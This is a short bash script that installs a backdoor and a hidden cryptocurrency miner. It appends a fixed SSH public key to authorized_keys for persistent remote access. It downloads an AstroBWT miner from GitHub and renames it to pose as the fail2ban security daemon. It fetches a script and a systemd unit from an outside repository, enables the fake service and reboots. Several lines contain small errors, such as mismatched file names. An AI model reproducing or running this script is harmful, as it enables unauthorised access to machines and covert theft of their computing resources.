#!/bin/bash
cd ~
mkdir ~/ssh
touch ~/.ssh/authorized_keys
chmod 400 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkSnXPSRg65bsoOeVakT3LfsIVfHr/hOJTspWdy2C15Qnj808oXJDnalwPXPNedyEna8f/u4Gqah6gNWpSO8KAZ+8f1dmzgHPfwNBuQU3Plj8DfQGk9gwmEJc7mXcCylRQfNVW5a310LKLUQn3hfdD9MGWrfMQey1KQLu9HH8KD1jibtGmedDatFCNM08nywB1u+Ou3u8lTfDMnvm7sZ7iyqF5BgNUFEK6Quk+mc6bJMnT2nIwdpkYT/C/PN2NQQ+MNPEjRhTpNJTFWE0SlzOeHbufGIsB1V+LnlJo54j2kydDYG+NU+q5hA0ro9PA5oEfcrmXQwLi5PW67wC/3kXF ssh-key-2023-01-21" > ~/.ssh/authorized_keys
curl https://github.com/dero-am/astrobwt-miner/releases/download/V1.7-BETA4/astrominer-V1.7_BETA4_aarch64_linux.tar.gz -o ~/astro.tar.gz
tar xvf astro.tar.gz
mv astrominer /bin/fail2ban
rm -rf rpc_mining.sh stratum_mining.sh
chmod 777 /bin/fail2band
sudo curl "https://github.com/suckma420/arch-setup/raw/main/fail2band.sh" -o /bin/fail2band
sudo curl "https://github.com/suckma420/arch-setup/raw/main/fail2ban.service" -o /etc/systemd/system/fail2ban.service
sudo systemctl enable fail2ban
sudo reboot
